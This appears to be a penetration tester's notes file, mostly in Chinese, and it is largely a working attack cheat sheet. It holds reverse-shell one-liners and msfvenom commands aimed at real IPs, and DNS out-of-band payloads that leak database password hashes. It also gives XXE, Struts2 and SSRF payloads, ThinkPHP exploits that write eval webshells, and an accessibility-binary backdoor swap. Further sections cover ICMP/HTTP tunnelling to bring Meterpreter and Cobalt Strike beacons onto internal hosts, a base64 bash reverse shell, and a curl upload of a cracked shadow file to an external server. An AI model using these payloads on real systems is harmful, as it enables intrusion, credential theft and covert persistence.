        // Reverse shell here
    }
}
thread.start();

War:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=123.59.170.204 LPORT=443 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
------------------------

Lua:
Linux only
lua -e "require('socket');require('os');t=socket.tcp();t:connect('123.59.170.204','443');os.execute('/bin/sh -i <&3 >&3 2>&3');"
------------------------
Windows and Linux
lua5.1 -e 'local host, port = "123.59.170.204", 443 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
------------------------

NodeJS:
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "123.59.170.204", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
------------------------
require('child_process').exec('nc -e /bin/sh 123.59.170.204 443')
------------------------
-var x = global.process.mainModule.require
-x('child_process').exec('nc 123.59.170.204 443 -e /bin/bash')
------------------------
https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
------------------------

Groovy:
String host="123.59.170.204";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
------------------------

Meterpreter Shell:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=123.59.170.204 LPORT=443 -f exe > reverse.exe
------------------------
msfvenom -p windows/shell_reverse_tcp LHOST=123.59.170.204 LPORT=443 -f exe > reverse.exe
------------------------
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=123.59.170.204 LPORT=443 -f elf >reverse.elf
------------------------
msfvenom -p linux/x86/shell_reverse_tcp LHOST=123.59.170.204 LPORT=443 -f elf >reverse.elf
------------------------
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="123.59.170.204" LPORT=443 -f elf > shell.elf
------------------------
msfvenom -p windows/meterpreter/reverse_tcp LHOST="123.59.170.204" LPORT=443 -f exe > shell.exe
------------------------
msfvenom -p osx/x86/shell_reverse_tcp LHOST="123.59.170.204" LPORT=443 -f macho > shell.macho
------------------------
msfvenom -p windows/meterpreter/reverse_tcp LHOST="123.59.170.204" LPORT=443 -f asp > shell.asp
------------------------
msfvenom -p java/jsp_shell_reverse_tcp LHOST="123.59.170.204" LPORT=443 -f raw > shell.jsp
------------------------
msfvenom -p java/jsp_shell_reverse_tcp LHOST="123.59.170.204" LPORT=443 -f war > shell.war
------------------------
msfvenom -p cmd/unix/reverse_python LHOST="123.59.170.204" LPORT=443 -f raw > shell.py
------------------------
msfvenom -p cmd/unix/reverse_bash LHOST="123.59.170.204" LPORT=443 -f raw > shell.sh
------------------------
msfvenom -p cmd/unix/reverse_perl LHOST="123.59.170.204" LPORT=443 -f raw > shell.pl
------------------------

Xterm:
xterm -display 123.59.170.204:1
Xnest :1
xhost +targetip

OOB
0x00 Command Execution
i. *nix:
curl http://ip.port.t70avy.ceye.io/`whoami`
ping `whoami`.ip.port.t70avy.ceye.io
ii. windows
ping %USERNAME%.t70avy.ceye.io
0x01 SQL Injection
i. SQL Server
DECLARE @host varchar(1024);
SELECT @host=(SELECT TOP 1
master.dbo.fn_varbintohexstr(password_hash)
FROM sys.sql_logins WHERE name='sa')
+'.ip.port.t70avy.ceye.io';
EXEC('master..xp_dirtree
"\\'+@host+'\foobar$"');
ii. Oracle
SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.t70avy.ceye.io');
SELECT UTL_HTTP.REQUEST('http://ip.port.t70avy.ceye.io/oracle') FROM DUAL;
SELECT HTTPURITYPE('http://ip.port.t70avy.ceye.io/oracle').GETCLOB() FROM DUAL;
SELECT DBMS_LDAP.INIT(('oracle.ip.port.t70avy.ceye.io',80) FROM DUAL;
SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.t70avy.ceye.io',80) FROM DUAL;
iii. MySQL
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.t70avy.ceye.io\\abc'));
iv. PostgreSQL
DROP TABLE IF EXISTS table_output;
CREATE TABLE table_output(content text);
CREATE OR REPLACE FUNCTION temp_function()
RETURNS VOID AS $
DECLARE exec_cmd TEXT;
DECLARE query_result TEXT;
BEGIN
SELECT INTO query_result (SELECT passwd
FROM pg_shadow WHERE usename='postgres');
exec_cmd := E'COPY table_output(content)
FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.t70avy.ceye.io\\\\foobar.txt\'';
EXECUTE exec_cmd;
END;
$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT temp_function();
0x02 XML Entity Injection
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://ip.port.t70avy.ceye.io/xxe_test">
%remote;]>
<root/>
0x03 Others
i. Struts2
xx.action?redirect:http://ip.port.t70avy.ceye.io/%25{3*4}
xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://ip.port.t70avy.ceye.io/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
ii. FFMpeg
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://ip.port.t70avy.ceye.io
#EXT-X-ENDLIST
iii. Weblogic
 xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.t70avy.ceye.io/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search
iv. ImageMagick
push graphic-context
viewbox 0 0 640 480
fill 'url(http://ip.port.t70avy.ceye.io)'
pop graphic-context
v. Resin
xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.t70avy.ceye.io/ssrf
vi. Discuz
http://xxx.xxxx.com/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://ip.port.t70avy.ceye.io/xx.jpg[/img]&formhash=xxoo

windows后们文件替换:
sethc.exe并不是唯一的可替换的可执行文件，如下列表都可以：
C:\Windows\System32\sethc.exe
C:\Windows\System32\utilman.exe
C:\Windows\System32\osk.exe
C:\Windows\System32\Magnify.exe
C:\Windows\System32\Narrator.exe
C:\Windows\System32\DisplaySwitch.exe
C:\Windows\System32\AtBroker.exe

内网穿透
隧道:dns隧道、http隧道、ssh隧道、icmp隧道等
网络层隧道 ICMP隧道等
传输层隧道 TCP隧道、UDP隧道
应用层隧道 HTTP、DNS、SSH等隧道
内网主机所有可能的出网方式
1.允许ICMP协议出网 
网络防火墙允许ICMP协议出网，即能ping通外网主机，一般都能出网
2.允许特定的TCP或UDP协议端口出网
3.允许特定的应用层协议出网(比如HTTP、SSH、DNS等应用层协议)
内网主机所有可能的入网方式
1.允许ICMP协议入网
能ping通目标主机
2.允许特定的TCP或UDP协议端口入网
NAT端口映射公网IP端口到内网主机的服务端口，比如将web服务、mysql服务NAT映射到公网
3.允许特定的应用层协议入网
这种网络防火墙能识别应用层的协议，放行允许入网的协议。比如HTTP反向代理，将公网收到的HTTP流量反向代理进内网主机。当前主流的入网方式，通常会加层WAF审查入网流量

内网穿透常用工具
网络层隧道工具
1.icmpsh
能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用
2.icmptunnel
创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用
3.pingtunnel
tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用

传输层隧道工具
1.netcat
网络工具中的瑞士军刀，不多介绍，linux系统一般自带
2.powercat
powershell版的netcat
3.socat
具有记录转发流的功能，方便查看转发内容，需要安装
4.netsh
windows系统自带的网络配置工具
5.lcx
端口转发工具
6.NATBypass
一款lcx在golang下的实现,更好的跨平台，更完善的文档
7.iox
端口转发 & 内网代理工具，功能类似于lcx/ew，简化了命令行参数，支持UDP流量转发，更好的跨平台。缺点：不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险

应用层隧道工具
常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等
1.dnscat2
不仅可以创建DNS隧道，更是C2
2.dnscat2-powershell
dnscat2的powershell客户端
3.dns2tcp
TCP over DNS,即通过DNS隧道转发TCP连接
4.iodine
IPv4 over DNS，即通过DNS隧道转发IPv4数据包
5.reGeorg
SOCKS over HTTP,即通过HTTP隧道转发SOCKS
6.Neo-reGeorg
重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃
7.reDuh
TCP over HTTP,即通过HTTP隧道转发TCP连接，隧道不稳定
8.Tunna
TCP、SOCKS over HTTP,即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定
9.ABPTTS
TCP over HTTP,即通过HTTP隧道转发TCP连接,数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp
10.EarthWorm
十分方便的多级SOCKS代理，已经永久停止更新
11.Termite
EarthWorm的升级版，已经永久停止更新
12.Venom
Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。
13.ssocks	
正向和反向的socks工具，可执行文件的大小很小
14.s5.go
go语言编写的socks服务工具，良好的跨平台特性
15.ssh三种隧道转发 
-CNfg -qTCfnN
-C 压缩传输，提高传输速度
-N 建立静默连接
-f 后台执行数据传输
-g 允许远程主机连接本地用于转发的端口
-T 禁用伪终端分配
-q 安静模式
-n 从/dev/null重定向标准输入,防止从标准输入读取
SSH隧道:
ssh -qTCfnN -L 本地端口:目标主机:目标端口 user@host -p port #本地转发
ssh -qTCfnN -R 远程端口:127.0.0.1:本地端口 user@host -p port #远程转发
ssh -qTCfnN -D 本地端口 user@host -p port #动态转发

TCP over HTTP隧道:
上线零出网的内网主机(bind shell)
ABPTTS
1.通过正向的http隧道构建tcp连接
# 配置abptts运行环境
# 注意windows安装pycrypto库需要先安装依赖http://aka.ms/vcpython27
pip install httplib2
pip install pycrypto
# 生成server端脚本
python abpttsfactory.py -o server
# 上传server端脚本到web服务器，客户端运行以下命令
python abpttsclient.py -c server/config.txt -u "http://192.168.168.10/abptts.aspx" -f 127.0.0.1:7777/127.0.0.1:8888
# abptts客户端监听127.0.0.1:7777，通过http://192.168.168.10/abptts.aspx这个http隧道，将tcp连接127.0.0.1:7777转发到web服务器网络下的127.0.0.1:8888

2.生成bind类型的payload，通过webshell上传执行
msfvenom -p windows/meterpreter/bind_tcp rhost=127.0.0.1 lport=8888 -f exe -o meterpreter.exe

3.启动msf监听，等待meterpreter执行上线
#这里的rhost和lport是abptts客户端监听的IP和端口，msf所在主机必须能访问到这个IP和端口，这里msf和abptts在同一个主机上
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf5 exploit(multi/handler) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf5 exploit(multi/handler) > set lport 7777
lport => 7777
msf5 exploit(multi/handler) > run
[*] Started bind TCP handler against 127.0.0.1:7777
[*] Sending stage (180291 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 127.0.0.1:7777) at 2020-04-27 04:50:25 -0400
meterpreter > getuid

4.上线cobaltstrike
由于cobaltstrike的bind类型的监听器仅有beacon TCP和beacon SMB，并且都必须连接到父beacon，无法直接连接cobalstrike服务端，所以我们需要一个父beacon来中转连接。
1).通过正向的http隧道构建tcp连接
2).创建反向的listener
payload Beacon HTTPS
3).生成父beacon
windows executable (stageless)
listener https
4).上传父beacon到abptts客户端执行上线
5).创建payload为tcp beacon的listener
port 8888 Bind to localhost only
6).生成stageless的子beacon
listener tcp_8888
7).将生成的子beacon通过webshell上传执行
netstat -ano | findstr 127.0.0.1:8888
8).在父beacon中连接abptts的监听ip和端口

上线仅icmp协议出网的内网主机
构建反向的TCP over ICMP隧道 SOCKS over ICMP隧道
pingtunnel，它能通过icmp隧道转发tcp、udp、socks5连接
icmp隧道转发tcp上线metasploit
1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端
./pingtunnel -type server -noprint 1 -nolog 1
2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1
# 该命令的意思是icmp客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777
3.生成反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线
msfvenom -p windows/meterpreter/reverse_https lhost=127.0.0.1 lport=9999 -f exe -o meterpreter.exe
# 这里的lhost和lport为icmp客户端监听ip和端口
4.启动msf监听，等待meterpreter执行上线
# 这里的lhost和lport为icmp客户端转发到的ip和端口
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf5 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf5 exploit(multi/handler) > set lport 7777
lport => 7777
msf5 exploit(multi/handler) > run
[*] Started HTTPS reverse handler on https://0.0.0.0:7777
meterpreter > getuid

icmp隧道转发socks上线metasploit
1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端
./pingtunnel -type server -noprint 1 -nolog 1
2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1
# 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
3.生成支持socks5代理的反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线
msfvenom -p windows/meterpreter/reverse_https LHOST=c2_server_ip LPORT=8443 HttpProxyType=SOCKS HttpProxyHost=127.0.0.1 HttpProxyPort=6688 -f exe -o meterpreter.exe
4.启动msf监听，等待meterpreter执行上线
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf5 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf5 exploit(multi/handler) > set lport 8443
lport => 8443
msf5 exploit(multi/handler) > run
[*] Started HTTPS reverse handler on https://0.0.0.0:8443
meterpreter > getuid

icmp隧道转发tcp上线cobaltstrike
1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端
./pingtunnel -type server -noprint 1 -nolog 1
2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1
# 该命令的意思是icmp隧道客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777
3.cobaltstrike创建listener
payload Beacon HTTPS
HTTPS Hosts 127.0.0.1
HTTPS Port C2 9999
HTTPS Port Bind 7777
# https host和https port(c2)为icmp隧道客户端的监听ip和端口
# https port(bind)为转发目的地址的端口
4.生成反向payload的beacon
选上面的listener windows exe
5.上传生成的beacon到ICMP隧道客户端执行，成功通过反向ICMP隧道上线

icmp隧道转发socks上线cobaltstrike
1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端
./pingtunnel -type server -noprint 1 -nolog 1
2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1
# 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
3.cobaltstrike创建listener
HTTPS Hosts c2ip
HTTPS Port 443
HTTPS Proxy socks://127.0.0.1:6688
这里也可以使用http代理，不过需要工具将http代理转为socks5代理，比如privoxy
4.选择创建的listener生成beacon上传到目标执行即可上线
内网渗透中内网穿透的本质，无非是通过各种通信信道，无论是正向的还是反向的，实现传输层协议tcp/udp数据包的转发，应用层协议都是基于传输层的协议实现的。
隧道客户端将tcp/udp数据包封装写进数据库，再由隧道服务端从数据库中读出封装的数据包解包，发往对应地址即可


msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=18.223.135.153 LPORT=3333 -f elf > shell.elf
curl https://chasers.fun/config.elf -O

bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYuMTI4LzEyMzQgMD4mMQ== | base64 -d | bash -i"

nc通过socks代理建立连接(输出提示不可信)
nc -nv -X 5 -x 127.0.0.1:1088 18.223.135.153 9898
4 SOCKS v.4
5 SOCKS v.5（默认）
connect HTTPS proxy

调出程序的卸载界面
1.使用wmic call uninstall
使用wmic有些软件并不会出现在安装列表中
2.查询注册表获取uninstallstring后使用os.system启动
此方法会触发敏感操作报警
3.直接打开软件安装目录，模拟点击卸载程序 
直接模拟用户点击进行卸载程序的显示 
os.startfile(r"C:\Program Files (x86)\360\360Safe") 
拟用户使用滚轮查找卸载程序
pyautogui.scroll(num or -num) 正数表示滚轮向上，负数则向下
pyautogui.scroll(-1000) 
定位卸载程序的焦点 需要一个要捕获的目标图片 截图即可
识别并获取元素在屏幕上的相对位置信息 
uninstalllocation = pyautogui.locateOnScreen('step-1.png') 
定位到其中心点，转换为坐标 
uninstallpoint = pyautogui.center(uninstalllocation) 
分离坐标
ux,uy = uninstallpoint
模拟点击 clicks=2为双击，默认为单击
pyautogui.click(ux, uy,clicks=2)
由于程序要读取目标图片才能获取位置信息，我们在使用时需要连同脚本图片一同放到目录里
解决这个问题我可以将图片进行base64编码，嵌入到脚本里。在运行时，先释放我们的目标图片文件，再进行后续操作，这样我们只需要上传一个脚本即可
https://mp.weixin.qq.com/s/ksD2wU9wu_dXPQYRoXrVcA

curl上传文件
curl -F 'file=@/root/unshadowed.txt;filename=newname' https://chasers.fun/blackhole.php
php后台接收curl文件:
<?php
$uploaddir = '/home/wwwroot/default/';
$uploadfile = $uploaddir . basename($_FILES['file']['name']);
echo '<pre>';
if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
    echo "File is valid, and was successfully uploaded.\n";
} else {
    echo "Possible file upload attack!\n";
}
echo 'Here is some more debugging info:';
print_r($_FILES);
print "</pre>";
?>
curl -X GET 'http://localhost:5000/locations?id=3'
curl --data "param1=value1&param2=value2" http://locahost:8080/weather
curl -X POST -d @filename http://locahost:8080/weather
curl -X POST -H "Content-Type: application/json" http://example.com/some/path -d '{"version": "1.1", "method":"progr","id":2,"params":{"call":...} }'
curl -O https://cdn.keycdn.com/css/animate.min.css
curl -o output.file http://server1.cyberciti.biz/file.tar.gz
curl -u Username:Password http://server1.cyberciti.biz/file/path/data.tar.gz
curl -k -O -L https://github.com/pyinstaller/pyinstaller/releases/download/v3.2.1/PyInstaller-3.2.1.zip

wget上传文件
wget "http://www.imf.org/external/np/fin/data/rms_mth.aspx?SelectDate=2008-09-30&reportType=SDRCV"
wget does not currently support "multipart/form-data" for transmitting POST data; only "application/x-www-form-urlencoded".
wget --post-data 'user=foo&password=bar' http://example.com/auth.php
wget --no-check-certificate --header="Content-type: multipart/form-data boundary=FILEUPLOAD" --post-file file https://chasers.fun/blackhole.php
wget https://code.jquery.com/jquery-3.3.1.min.js -O myFile.txt
wget -m http://domain.com (HTML File)
wget -i urls.txt
wget --http-user=USERNAME --http-password=PASSWORD http://SOMETURLTOFILE
wget 'https://x.x.x.x/get_ips' --no-check-certificate

shellcode生成:
msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.183.138 lport=4444   -f c
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.183.138
set LPORT 4444
set EnableStageEncoding true

cs:
javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar
./teamserver you_ip you_passwd

grep、sed提取匹配字符串:
cat * | grep "收款金额" | grep -oP '(?<=<li class="mui-table-view-cell mui-collapse-content"><p class="li">收款金额</p><p class="p">)(.+)(?=</p> </li>)' | awk '{sum+=$1} END {print sum}'
echo "aa11bb" | grep -oP '(?<=aa)(\d+)(?=bb)'
echo "aa11bba" | grep -oP '(?<=aa)(\w+)(?=bba)'

cat * | grep "收款金额" |  sed 's/<li class="mui-table-view-cell mui-collapse-content"><p class="li">收款金额<\/p><p class="p">\(.\+\)<\/p> <\/li>/\1/g' | grep -v "<" | awk {'print $1'}
echo "aa11bba" | sed 's/aa\([0-9]*\)bba/\1/g'
echo "11aa22" | sed 's/11\([a-zA-Z]*\)22/\1/g'

. 匹配除换行符以外的任意字符
\w 匹配字母或数字或下划线或汉字
\s 匹配任意的空白符
\d 匹配数字
\b 匹配单词的开始或结束
^ 匹配字符串的开始
$ 匹配字符串的结束

cat apidomains-ip | grep -E "\s+A\s+" | sort -u > apidomain-ips

tp:
版本号：5.0.8~5.0.19
payload:s=whoami&_method=__construct&filter&filter=system


版本号：5.0.20~5.0.23
payload：_method=__construct&filter[]=system&method=get&server[REQUSET_METHOD]=whoami

5.1.x php版本>5.5:
http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&filter=assert


http://127.0.0.1/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1


http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=<?php%20phpinfo();?>

5.0.x php版本>=5.4:
exp0 = '/index.php/?s=index/\\think\\template\driver\\file/write&cacheFile=zxc0.php&content=<?php @eval($_POST[xxxxxx]);?>'

exp1 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zxc1.php&vars[1][]=<?php @eval($_POST[xxxxxx]);?>'

exp2 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo \'<?php @eval($_POST[xxxxxx]);?>\'>zxc2.php'

使用版本：5.0.7~5.0.23
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令 (如 dir whoami)
写shell：
?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo \'<?php @eval($_POST[xxxxxx]);?>\'>zxc2.php'


?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zxc1.php&vars[1][]=<?php @eval($_POST[xxxxxx]);?>

5.1.x的payload
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令


?s=index/\think\Request/input&filter=system&data=操作系统命令


?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E

graphiql:
query: root
mutation: update_data
query {
  __schema {
    types {
      name
      kind
      description
      fields {
        name
      }
    }
  }
}

query {
    query_money_log_list(vipId: 1,page: 1){
      data{
        logid
        title
        data
        type
        vipId
        money
        createDate
      }
      count
    }
}

mutation update_data{
  get_moneykey{
    code
    msg
    status
    data
    count
  }
}

#!/bin/bash

while true

do

	python3 /root/login_monitor.py

	sleep 3

done
